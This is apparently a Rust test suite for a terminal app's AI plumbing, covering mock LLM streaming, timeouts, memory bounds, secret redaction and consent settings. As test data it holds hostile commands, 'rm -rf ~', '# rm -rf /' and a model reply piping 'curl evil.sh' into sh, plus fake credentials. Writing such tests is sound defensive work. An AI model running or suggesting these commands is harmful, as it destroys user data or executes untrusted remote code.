//! Item 7 (+ critic H10): AI plumbing against local mock servers (tests/mock_llm.py), no real model.
use super::Soft;
use crate::ai::chat::stream::{self, ApiMessage, StreamEvent};
use crate::ai::hub::{AskRequest, ContextItem, Intent};
use crate::ai::LlmConfig;
use std::io::{BufRead, BufReader};
use std::process::{Child, Command, Stdio};
use std::time::{Duration, Instant};

struct Mock {
    child: Child,
    port: u16,
    dir: std::path::PathBuf,
}
impl Drop for Mock {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}
fn mock(name: &str) -> Mock {
    let dir = super::scratch_dir(&format!("mock-{name}"));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let script = concat!(env!("CARGO_MANIFEST_DIR"), "/tests/mock_llm.py");
    let mut child = Command::new("python3").args(["-I", script, dir.to_str().unwrap()]).stdout(Stdio::piped()).spawn().expect("python3");
    let mut line = String::new();
    BufReader::new(child.stdout.take().unwrap()).read_line(&mut line).unwrap();
    let port: u16 = line.trim().strip_prefix("PORT ").unwrap().parse().unwrap();
    Mock { child, port, dir }
}
impl Mock {
    fn cfg(&self, scn: &str, ollama: bool) -> LlmConfig {
        LlmConfig {
            provider: if ollama { "ollama".into() } else { "openai".into() },
            model: "mock".into(),
            api_url: format!("http://127.0.0.1:{}/{scn}", self.port),
            api_key: Some("sk-test-123".into()),
            enabled: true,
        }
    }
    fn log(&self, name: &str) -> String {
        std::fs::read_to_string(self.dir.join(name)).unwrap_or_default()
    }
}

fn run_stream(cfg: &LlmConfig, wait: Duration) -> (Vec<StreamEvent>, Duration, bool) {
    let h = stream::spawn_with_wake(cfg, || vec![ApiMessage::new("system", "sys"), ApiMessage::new("user", "hi")], || {});
    let t0 = Instant::now();
    let mut ev = Vec::new();
    loop {
        let left = wait.saturating_sub(t0.elapsed());
        match h.rx.recv_timeout(left.max(Duration::from_millis(1))) {
            Ok(e) => {
                let end = matches!(e, StreamEvent::Done | StreamEvent::Error(_));
                ev.push(e);
                if end {
                    return (ev, t0.elapsed(), false);
                }
            }
            Err(_) => return (ev, t0.elapsed(), t0.elapsed() >= wait),
        }
    }
}
fn deltas(ev: &[StreamEvent]) -> String {
    ev.iter().filter_map(|e| if let StreamEvent::Delta(t) = e { Some(t.as_str()) } else { None }).collect()
}
fn rss_mb() -> u64 {
    let out = Command::new("ps").args(["-o", "rss=", "-p", &std::process::id().to_string()]).output().unwrap();
    String::from_utf8_lossy(&out.stdout).trim().parse::<u64>().unwrap_or(0) / 1024
}

#[test]
fn streaming_openai_and_ollama() {
    let m = mock("stream");
    let mut s = Soft::new("ai");
    let (ev, d, to) = run_stream(&m.cfg("sse_ok", false), Duration::from_secs(10));
    s.check("sse_ok_deltas_in_order", deltas(&ev) == "Use `ls 中` and\nmore done" && ev.last() == Some(&StreamEvent::Done) && !to, format!("{ev:?} in {d:?}"));
    let req = m.log("req_sse_ok.log");
    s.check("sse_request_headers", req.contains("Bearer sk-test-123") && req.contains("text/event-stream"), req.trim().to_string());
    let body = m.log("lastbody_sse_ok.json");
    s.check("request_body_has_stream_true", body.contains("\"stream\":true") && body.contains("\"model\":\"mock\""), body.chars().take(200).collect::<String>());

    let (ev, _, _) = run_stream(&m.cfg("sse_unicode_escape", false), Duration::from_secs(10));
    s.check("sse_unicode_escapes_decoded", deltas(&ev) == "中文 😀 é \n tab\t q\" bs\\ sl/", format!("{:?}", deltas(&ev)));
    let (ev, _, _) = run_stream(&m.cfg("sse_crlf", false), Duration::from_secs(10));
    s.check("sse_crlf_lines", deltas(&ev) == "ab" && ev.last() == Some(&StreamEvent::Done), format!("{ev:?}"));
    let (ev, _, _) = run_stream(&m.cfg("sse_reasoning", false), Duration::from_secs(10));
    s.check("reasoning_content_ignored_answer_kept", deltas(&ev) == "answer", format!("{ev:?} (reasoning_content from deepseek-reasoner is dropped; UI shows nothing while model 'thinks')"));
    let (ev, _, _) = run_stream(&m.cfg("sse_malformed", false), Duration::from_secs(10));
    s.check("malformed_lines_skipped_stream_survives", deltas(&ev) == "ok" && ev.last() == Some(&StreamEvent::Done), format!("{ev:?}"));
    let (ev, _, _) = run_stream(&m.cfg("sse_garbage_only", false), Duration::from_secs(10));
    s.check("non_sse_200_body_reports_error_not_empty_answer", matches!(ev.last(), Some(StreamEvent::Error(_))), format!("{ev:?} (a 200 HTML/proxy page ends as `Done` with zero deltas: empty assistant message, no error)"));

    for (scn, want) in [("sse_500_json", "boom upstream"), ("sse_500_html", "HTTP 502"), ("sse_401", "Incorrect API key"), ("sse_429", "429")] {
        let (ev, _, _) = run_stream(&m.cfg(scn, false), Duration::from_secs(10));
        s.check(&format!("http_error_{scn}"), matches!(ev.last(), Some(StreamEvent::Error(e)) if e.contains(want)), format!("{ev:?}"));
    }
    let (ev, _, _) = run_stream(&m.cfg("sse_cut", false), Duration::from_secs(10));
    s.check("connection_reset_mid_stream_is_error", ev.last().map_or(false, |e| matches!(e, StreamEvent::Error(_))), format!("{ev:?} (truncated stream should not look like success)"));

    // Ollama NDJSON
    let (ev, _, _) = run_stream(&m.cfg("nd_ok", true), Duration::from_secs(10));
    s.check("ndjson_ok", deltas(&ev) == "Hello 世界" && ev.last() == Some(&StreamEvent::Done), format!("{ev:?}"));
    let req = m.log("req_nd_ok.log");
    s.check("ollama_no_bearer_sent", req.contains("\"auth\": null"), req.trim().to_string());
    let (ev, _, _) = run_stream(&m.cfg("nd_error", true), Duration::from_secs(10));
    s.check("ndjson_error_line", ev.last() == Some(&StreamEvent::Error("model runner crashed".into())) && deltas(&ev) == "partial", format!("{ev:?}"));
    let (ev, _, _) = run_stream(&m.cfg("nd_trunc", true), Duration::from_secs(10));
    s.check("ndjson_truncated_json_is_error", matches!(ev.last(), Some(StreamEvent::Error(_))), format!("{ev:?} (half a JSON line then EOF is reported as normal Done)"));
    let (ev, _, _) = run_stream(&m.cfg("nd_404", true), Duration::from_secs(10));
    s.check("ollama_model_not_found", matches!(ev.last(), Some(StreamEvent::Error(e)) if e.contains("404") && e.contains("not found")), format!("{ev:?}"));
    // connection refused
    let mut dead = m.cfg("sse_ok", false);
    dead.api_url = "http://127.0.0.1:9".into();
    let (ev, d, _) = run_stream(&dead, Duration::from_secs(10));
    s.check("connection_refused_error", matches!(ev.last(), Some(StreamEvent::Error(e)) if e.starts_with("Request failed")), format!("{ev:?} in {d:?}"));
    s.finish();
}

#[test]
fn timeouts_stalls_and_cancellation() {
    let m = mock("timeouts");
    let mut s = Soft::new("ai");
    // server never answers
    let (ev, d, to) = run_stream(&m.cfg("sse_noresp", false), Duration::from_secs(20));
    s.check("no_response_times_out_within_20s", !to, format!("{ev:?} after {d:?}; timed_out_waiting={to} (ureq agent has no timeout configured in stream.rs::run)"));
    // stalls after two deltas (keepalive comments only)
    let (ev, d, to) = run_stream(&m.cfg("sse_stall", false), Duration::from_secs(15));
    s.check("stalled_stream_errors_within_15s", !to, format!("{:?} after {d:?}; keepalive comments forever = UI stays 'answering' until user presses Stop", ev.iter().take(3).collect::<Vec<_>>()));
    // cancel while streaming: server should see the connection closed promptly
    let h = stream::spawn_with_wake(&m.cfg("sse_endless", false), || vec![ApiMessage::new("user", "hi")], || {});
    let first = h.rx.recv_timeout(Duration::from_secs(5));
    s.check("endless_first_delta", matches!(first, Ok(StreamEvent::Delta(_))), format!("{first:?}"));
    let t0 = Instant::now();
    h.cancel();
    let mut after = 0;
    while t0.elapsed() < Duration::from_millis(1500) {
        if h.rx.recv_timeout(Duration::from_millis(50)).is_ok() { after += 1; }
    }
    std::thread::sleep(Duration::from_secs(1));
    let closed = m.log("endless_closed.log");
    s.check("cancel_closes_connection_within_3s", closed.contains("client closed"), format!("server log: {:?}; {after} events delivered after cancel()", closed.trim()));
    s.check("no_events_after_cancel_beyond_inflight", after <= 2, format!("{after}"));
    // drop = cancel as well
    drop(h);
    // cancel on a server that has stopped sending (no keepalive): thread stays blocked in read.
    let h = stream::spawn_with_wake(&m.cfg("sse_noresp", false), || vec![ApiMessage::new("user", "hi")], || {});
    std::thread::sleep(Duration::from_millis(500));
    h.cancel();
    drop(h);
    s.info("cancel_on_silent_server", "code-read: cancel flag is only checked between lines (stream.rs pump) and before send; a worker blocked in ureq read/connect stays alive until the server answers or closes (thread + socket leak, unbounded without a timeout)");
    s.finish();
}

#[test]
fn unbounded_line_buffering() {
    let _rss = super::rss_serial();
    let m = mock("longline");
    let mut s = Soft::new("ai");
    // Process-wide RSS also sees whatever other tests allocate meanwhile, so a
    // limit overshoot is retried; unbounded buffering would overshoot every time.
    let (mut peak, mut after_cancel, mut evs) = (0, 0, Vec::new());
    for _attempt in 0..3 {
        let base = rss_mb();
        let h = stream::spawn_with_wake(&m.cfg("sse_longline", false), || vec![ApiMessage::new("user", "hi")], || {});
        peak = 0;
        evs = Vec::new();
        for _ in 0..12 {
            std::thread::sleep(Duration::from_millis(500));
            peak = peak.max(rss_mb().saturating_sub(base));
            while let Ok(e) = h.rx.try_recv() { evs.push(format!("{e:?}").chars().take(100).collect::<String>()); }
        }
        h.cancel();
        std::thread::sleep(Duration::from_secs(3));
        after_cancel = rss_mb().saturating_sub(base);
        if peak < 64 {
            break;
        }
    }
    s.info("longline_events", format!("{evs:?}; server log {:?}", m.log("longline_closed.log")));
    s.check("single_giant_sse_line_is_bounded", peak < 64, format!("RSS +{peak} MB within 6 s from a stream that never sends a newline (BufRead::lines has no cap); +{after_cancel} MB 3 s after cancel(); cancel is not honoured mid-line"));
    s.finish();
}

#[test]
fn non_streaming_backend_json_handling() {
    let m = mock("backend");
    let mut s = Soft::new("ai");
    let cfg = m.cfg("echo", false);
    let r = crate::ai::backend::complete_simple(&cfg, "plain prompt with \"quotes\" and \\ backslash and\nnewline");
    s.check("complete_simple_plain_ok", r.as_deref().map_or(false, |t| t.starts_with("echo:")), format!("{r:?}"));
    // terminal output routinely contains ESC / BEL / other C0 controls (colors, progress bars)
    let r = crate::ai::backend::complete_simple(&cfg, "error output: \x1b[31mfailed\x1b[0m \x07 \x08 \x0c");
    s.check("complete_simple_with_ansi_control_chars_ok", r.is_ok(), format!("{r:?}; server saw: {}", m.log("badjson_echo.log").trim()));
    let r = crate::ai::backend::complete_simple(&m.cfg("echo_ascii", false), "x");
    s.check("unicode_escapes_in_response_decoded", r.as_deref() == Ok("中文 é 😀"), format!("{r:?}"));
    let r = crate::ai::backend::complete_simple(&m.cfg("echo_null", false), "x");
    s.check("null_content_with_tool_calls_does_not_return_wrong_text", !matches!(&r, Ok(t) if t.contains("WRONG")), format!("{r:?}"));
    let r = crate::ai::backend::complete_simple(&m.cfg("echo_nd", true), "x");
    s.check("ollama_nonstream_ok", r.as_deref() == Ok("ollama-echo"), format!("{r:?}"));
    // new streaming request builder with control characters (pure)
    let c = m.cfg("sse_ok", false);
    let rq = stream::build_request(&c, &[ApiMessage::new("user", "a\x1b[31mred\x07\u{8}\u{c}\0 b")]);
    let ok = crate::ai::chat::json::Json::parse(&rq.body).is_some();
    s.check("stream_request_body_is_valid_json_with_controls", ok, rq.body.replace('\x1b', "\\e"));
    s.finish();
}

#[test]
fn prompt_builders_and_context() {
    use crate::ai::inline::context::{resolve, BlockSnap, ContextModel, Resolved};
    let mut s = Soft::new("ai");
    let out: String = (0..300).map(|i| format!("line {i}\n")).collect();
    let req = AskRequest::new("", Intent::Fix).with(ContextItem::Block { command: "cargo build".into(), exit_code: Some(101), output: out, cwd: Some("/work/x".into()), running: false });
    let p = req.prompt();
    s.check("block_prompt_has_command_exit_cwd", p.contains("`cargo build`") && p.contains("exit code 101") && p.contains("Working directory: /work/x"), p.chars().take(160).collect::<String>());
    s.check("block_prompt_keeps_last_80_lines", p.contains("line 299") && !p.contains("line 219\n") && p.contains("line 220") && p.contains("220 omitted"), "tail kept, head dropped");
    let giant = "A".repeat(10 << 20);
    let p = AskRequest::new("why", Intent::Explain).with(ContextItem::Block { command: "x".into(), exit_code: Some(1), output: giant, cwd: None, running: false }).prompt();
    s.check("single_giant_output_line_is_capped", p.len() < 200_000, format!("prompt is {} bytes for a 10 MB single-line block (AskRequest::prompt limits lines, not bytes; fix_prompt caps per-line chars but this path does not)", p.len()));
    let secret_out = "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nAuthorization: Bearer sk-live-abcdef1234567890\npassword=hunter2\n";
    let p = AskRequest::new("", Intent::Explain).with(ContextItem::Block { command: "env | grep -i key".into(), exit_code: Some(0), output: secret_out.into(), cwd: None, running: false }).prompt();
    s.check("secrets_redacted_before_leaving_machine", !p.contains("wJalrXUtnFEMI") && !p.contains("sk-live-abcdef") && !p.contains("hunter2"), "AskRequest::prompt passes terminal output verbatim; src/tools/secret_mask.rs is not used on the AI path");
    let fp = crate::ai::inline::fix::fix_prompt("curl -H 'Authorization: Bearer sk-live-abc' x", 1, secret_out, "/w", "macOS", "zsh");
    s.check("fix_prompt_redacts_secrets", !fp.contains("sk-live-abcdef") && !fp.contains("hunter2"), "auto-fix sends the last lines of every failed command's output");
    let snap = |c: &str| BlockSnap { command: c.into(), exit_code: Some(1), output: format!("out of {c}"), cwd: None, running: false, line: 3 };
    let m = ContextModel { selection: Some(("sel text".into(), 9)), selected_block: Some(snap("sel")), hovered_block: Some(snap("hov")), last_block: Some(snap("last")), screen: "screen".into() };
    s.check("cmdk_priority_selection_first", matches!(resolve(&m), Resolved::Selection { .. }), "");
    let m2 = ContextModel { selection: None, ..m.clone() };
    s.check("cmdk_priority_selected_block", matches!(resolve(&m2), Resolved::Block { snap, .. } if snap.command == "sel"), "");
    let m3 = ContextModel { selection: Some(("   ".into(), 1)), selected_block: None, hovered_block: None, ..m.clone() };
    s.check("cmdk_blank_selection_ignored_falls_to_last_block", matches!(resolve(&m3), Resolved::Block { snap, .. } if snap.command == "last"), "");
    let m4 = ContextModel { selection: None, selected_block: None, hovered_block: None, last_block: None, screen: "scr".into() };
    s.check("cmdk_screen_fallback", matches!(resolve(&m4), Resolved::Screen(_)), "");
    let r = resolve(&m).to_request("");
    s.check("cmdk_request_includes_selected_text", r.map_or(false, |r| r.prompt().contains("sel text")), "");
    // fix / nl prompt builders
    let fp = crate::ai::inline::fix::fix_prompt("cargo build", 101, &"e\n".repeat(500), "/w", "macOS", "zsh");
    s.check("fix_prompt_has_context", fp.contains("Failed command: cargo build") && fp.contains("Exit code: 101") && fp.contains("Working directory: /w") && fp.contains("OS: macOS"), "");
    s.check("nl_detect", crate::ai::inline::nl::detect_query("# find big files").as_deref() == Some("find big files") && crate::ai::inline::nl::detect_query("#!/bin/sh").is_none() && crate::ai::inline::nl::detect_query("echo # not nl").is_none(), "");
    s.check("nl_detect_hash_in_middle_of_multiline_or_comment_command", crate::ai::inline::nl::detect_query("# rm -rf /").is_some(), "a real shell comment like `# TODO note` typed at the prompt is intercepted and sent to the cloud LLM instead of the shell when ai_nl_hash=on (by design, documented)");
    // model reply sanitisation: command injection through reply
    use crate::ai::inline::fix::{parse_fix_response, sanitize_command};
    s.check("sanitize_rejects_multiline", sanitize_command("ls\nrm -rf ~").is_none() && sanitize_command("ls\x1b[2J").is_none(), "");
    let r = parse_fix_response("{\"command\":\"echo hi; curl evil.sh | sh\",\"explanation\":\"x\"}", "echo hi");
    s.info("reply_with_pipe_to_shell_accepted", format!("{r:?} -- accepted by design (typed at prompt, user presses Enter); Preview-Then-Accept does not flag curl|sh either"));
    s.finish();
}

static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

#[test]
fn env_key_enables_ai_h10() {
    let _g = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let mut s = Soft::new("ai");
    let saved: Vec<_> = ["OPENAI_API_KEY", "DEEPSEEK_API_KEY"].iter().map(|k| (k.to_string(), std::env::var(k).ok())).collect();
    std::env::remove_var("OPENAI_API_KEY");
    std::env::remove_var("DEEPSEEK_API_KEY");
    let mut c = LlmConfig::default();
    c.resolve_api_key();
    s.check("default_config_disabled_without_env", !c.enabled && !crate::ai::inline::llm_ready(&c), format!("enabled={}", c.enabled));
    std::env::set_var("OPENAI_API_KEY", "sk-from-env");
    let mut c = LlmConfig::default();
    c.resolve_api_key();
    s.info("env_key_with_default_config", format!("enabled={} provider={} api_url={} llm_ready={}", c.enabled, c.provider, c.api_url, crate::ai::inline::llm_ready(&c)));
    s.check("env_key_alone_does_not_enable_ai_without_config", !c.enabled, "OPENAI_API_KEY in the environment flips enabled=true even though the user never configured [llm] (config/mod.rs resolve_api_key); target stays localhost:11434 (Ollama) because provider/url default, so no cloud traffic in this exact case");
    let mut c = LlmConfig::default();
    c.provider = "openai".into();
    c.api_url = "https://api.deepseek.com".into();
    c.resolve_api_key();
    s.info("env_key_with_cloud_url_in_config", format!("enabled={} key_present={} llm_ready={} -> auto_fix (default ON) will send last lines of every failed command's output to {}", c.enabled, c.api_key.is_some(), crate::ai::inline::llm_ready(&c), c.api_url));
    // Harness fix: this check was hard-coded `false`. It now asserts the property it describes: with a cloud
    // URL + env key and no consent, auto_fix is off by default and the consent policy denies AI.
    let dflt = crate::config::Config::default();
    let mut with_llm = crate::config::Config::default();
    with_llm.llm = c.clone();
    s.check("cloud_ai_requires_explicit_opt_in_beyond_url_and_env_key", !dflt.ai_auto_fix && !crate::ai::consent::allowed_config(&dflt, &dflt.llm) && !c.enabled && !crate::ai::consent::allowed_config(&with_llm, &c), format!("auto_fix_default={} enabled={} allowed={}", dflt.ai_auto_fix, c.enabled, crate::ai::consent::allowed_config(&with_llm, &c)));
    for (k, v) in saved {
        match v { Some(v) => std::env::set_var(k, v), None => std::env::remove_var(k) }
    }
    s.finish();
}
